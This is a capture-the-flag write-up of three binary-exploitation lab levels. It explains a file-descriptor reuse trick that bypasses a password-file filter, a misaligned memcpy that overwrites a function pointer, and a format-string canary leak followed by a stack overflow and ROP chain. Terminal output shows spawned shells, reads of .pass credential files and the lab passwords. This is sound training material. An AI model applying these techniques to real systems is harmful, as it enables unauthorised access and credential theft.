## lab8C

We have to provide 2 arguments when executing this binary. They should be of this form:

```bash
Hi. This program will do a lexicographical comparison of the contents of two files. It has the bonus functionality of being able to process either filenames or file descriptors.
Usage: /levels/lab08/lab8C {-fn=|-fd=} {-fn=|-fd=}
```

We would first think that we should just open ```lab8B```'s password, right? Well, let's check the source code.

Looking through the functions, there are a bunch of checks that are made, to make sure that we give the correct input, to make sure that the memory allocations and file descriptors don't fail and, of course:

```c
char* securityCheck(char* arg, char* s)
{
    if(strstr(arg, ".pass"))
        return "<<<For security reasons, your filename has been blocked>>>";
    return s;
}
```

However, we can circumvent this by trying to open the password file in the ```first argument``` with the ```-fn``` flag and try to re-use that same ```file descriptor``` - and it works!

```bash
lab8C@warzone:~$ /levels/lab08/lab8C  -fn=/home/lab8B/.pass -fd=3
"<<>>" is lexicographically equivalent to "3v3ryth1ng_Is_@_F1l3
"
```

## lab8B

We have a ```struct vector``` here:

```c
#define MAX_FAVES 10

struct vector {
    void (*printFunc)(struct vector*);
    char a;
    short b;
    unsigned short c;
    int d;
    unsigned int e;
    long f;
    unsigned long g;
    long long h;
    unsigned long long i;
};

struct vector v1;
struct vector v2;
struct vector v3;
struct vector* faves[MAX_FAVES];
```

And this is what the ```help``` option in the ```menu``` tells us:

```c
void help()
{
    printf("\
This program adds two vectors together and stores it in a third vector. You \
can then add the sum to your list of favorites, or load a favorite back into \
one of the addends.\n");
}
```

Alright, we see that there is a ```function pointer``` in the struct vector. We can also see, while analyzing the source code, that there isn't really any option to smash the stack. We turn our attention onto the heap. There are no ```free``` calls here, so every ```fave``` stored cannot be removed, which means no ```use after free```. There isn't really any option to cause a ```heap overflow``` either. What gives? Let's look at the ```fave``` function:

```c
void fave()
{
    unsigned int i;
    for(i=0; i
        if(!faves[i])
            break;
    if(i == MAX_FAVES)
        printf("You have too many favorites.\n");
    else
    {
        faves[i] = malloc(sizeof(struct vector));
        memcpy(faves[i], (int*)(&v3)+i, sizeof(struct vector));
        printf("I see you added that vector to your favorites, \
but was it really your favorite?\n");
    }
}
```

It allocated space for ```faves[i]``` on the heap and then does a ```memcpy``` to copy over the ```sum``` in ```v3``` onto the ```heap```. Notice the ```memcpy call```- its ```second argument``` is kinda weird, right?

What turns out is that it won't copy ```v3``` entirely after the first ```fave```. In our first fave save, our index i is 0. Next time it will be 1, and will omit the first 4 bytes from ```v3```, essentially making the bytes found in ```a``` and ```b``` variables to act as our ```function pointer```! Next time after that will omit 8 bytes and so on!

It will cut ```index*4 bytes``` from the top of ```v3``` for each ```fave``` stored, which means we can set the ```function pointer``` to any value we want!

There is a ```thisIsASecret``` function which spawns a shell. With the help of ```printVector``` we can leak the address in ```printFunc``` and calculate ```thisIsASecret``` address.

Now we only have to load the corrupted save into either ```v1``` or ```v2``` and call our win function!

Oh and don't forget to store our ```thisIsASecret``` address into an ```unsigned``` variable that is at least ```4 bytes```, otherwise ```INT_MAX``` will replace it automatically. This means that we will have to make several ```fave``` saves in order for that ```unsigned``` variable to reach the ```function pointer```!

```bash
lab8B@warzone:/tmp/transcen/lab08$ python expl8B.py
[+] Starting program '/levels/lab08/lab8B': Done
[*] Switching to interactive mode
char a: 1
short b: 1
unsigned short c: 1
int d: 1
unsigned int e: 1
long f: 1
unsigned long g: 1
long long h: 1
unsigned long long i: 1
+------------------------------------------------------------+
|                                                            |
|  1. Enter data                                          :> |
|  2. Sum vectors                                         :] |
|  3. Print vector                                        :3 |
|  4. Save sum to favorites                               8) |
|  5. Print favorites                                     :O |
|  6. Load favorite                                       :$ |
|  9. Get help                                            :D |
|                                                            |
+------------------------------------------------------------+
$ cat /home/lab8A/.pass
Th@t_w@5_my_f@v0r1t3_ch@11
```

## lab8A

Looking at ```selectABook``` function, the first function that is called by ```main```, we can see an obvious format string  vulnerability:

```c
    char buf_secure[512];
    scanf("%s", buf_secure);
    printf(buf_secure);
```

Using this we can read off the stack and find out what is the value of the ```randomized canary```. It it at position ```130```.

Looking at the next function call in ```main```, some global pointer variables are given values as addresses on the stack, which are then dereferenced and compared.

```c
    char buf[24];
    // to avoid the null
    global_addr = (&buf+0x1);
    // have to make sure no one is stealing the librarians cookies (they get angry)
    global_addr_check = global_addr-0x2;


    if(((*( global_addr))^(*(global_addr_check))) != ((*( global_addr))^(0xdeadbeef))){
        printf("\n\nWoah There\n");
        // why are you trying to break my program q-q
        exit(EXIT_FAILURE);
    }  
```

If we look in the memory, those addresses correspond to:

```
global_addr is the canary (ebp - 4)
global_addr_check is (ebp - 12)
```

Since the ```canary``` must not change, in order to pass the ```conditional statement``` we have to change the value at the address pointed by ```global_addr_check``` to ```0xdeadbeef```.

We have a ```read``` function which clearly overflows the stack so after setting ```*global_addr_check``` to ```0xdeadbeef``` and making sure the ```canary``` is intact, we append a ```ropchain``` at ```ret```. After exiting the function we will spawn a shell!

```bash
lab8A@warzone:/tmp/transcen/lab08$ python expl8A.py
[+] Opening connection to 172.16.37.128 on port 8841: Done
[*] Switching to interactive mode

What were you thinking, that isn't a good book.A

*************************************************
{|} Aristote's Metaphysics 350 B.C. Book VIII {|}
*************************************************

To return to the difficulty which has been stated with respect both to definitions and to numbers, what is the cause of their unity? In the case of all things which have several parts and in which the totality is not, as it were, a mere heap, but the whole is something beside the parts, there is a cause; for even in bodies contact is the cause of unity in some cases, and in others viscosity or some other such quality. And a definition is a set of words which is one not by being connected together, like the Iliad, but by dealing with one object.-What then, is it that makes man one; why is he one and not many, e.g. animal + biped, especially if there are, as some say, an animal-itself and a biped-itself? Why are not those Forms themselves the man, so that men would exist by participation not in man, nor in-one Form, but in two, animal and biped, and in general man would be not one but more than one thing, animal and biped?

...please turn to page 394...

..I like to read ^_^ <==  $ whoami
lab8end
$ cat /home/lab8end/.pass
H4x0r5_d0nt_N33d_m3t4pHYS1c5
```
